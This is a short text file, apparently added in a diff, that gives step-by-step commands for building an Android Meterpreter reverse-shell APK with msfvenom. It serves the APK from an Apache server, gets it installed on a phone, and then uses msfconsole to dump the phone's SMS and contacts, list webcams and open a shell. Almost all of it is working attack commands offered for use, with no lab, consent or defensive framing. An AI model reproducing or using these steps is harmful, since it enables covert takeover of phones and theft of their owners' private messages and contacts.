@@ -1,0 +1,77 @@
+If not working msfenom -p ...... so you can run the follwing command for update
+apt-get update
+apt-get upgrade
+apt-get dist-upgrade
+
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.233 LPORT=4444 R > hackand.apk 
+
+send by apache create handand.apk into this folder you have to create in /var/www folder
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.233 LPORT=4444 R > /var/www/html/hackand.apk 
+
+if permission denied 
+zsh: permission denied: /var/www/html/hackand.apk
+then type
+
+sudo chown -R $USER:$USER /var/www
+
+
+send hackand.apk to mobile
+or 
+send by apache server
+
+service apache2 status 
+service apache2 start
+service apache2 status 
+
+msfconsole 
+(
+use multi/handler
+or
+use exploit/multi/handler
+)
+set payload android/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.43.233
+set lport 4444
+exploit
+
+install hackand.apk in ardroid phone by apache open web browser type http://192.168.43.233/hackand.apk
+
+
+or
+
+install or start hackand.pak in mobile or send by usb or google drive
+
+sysinfo
+background
+sessions
+sessions -i 1
+help
+
+or
+
+dump_sms
+dump_contacts
+check_root
+webcam_list
+app_list
+shell   (ls,whoami,pwd etc)
+help
+
+or
+
+dump_
+after dump you cant see all detail in kali linux
+cat contact_dump_23file on kali location are downloaded
+
+
+or 
+
+background 
+exploit
+
+
+
+
+
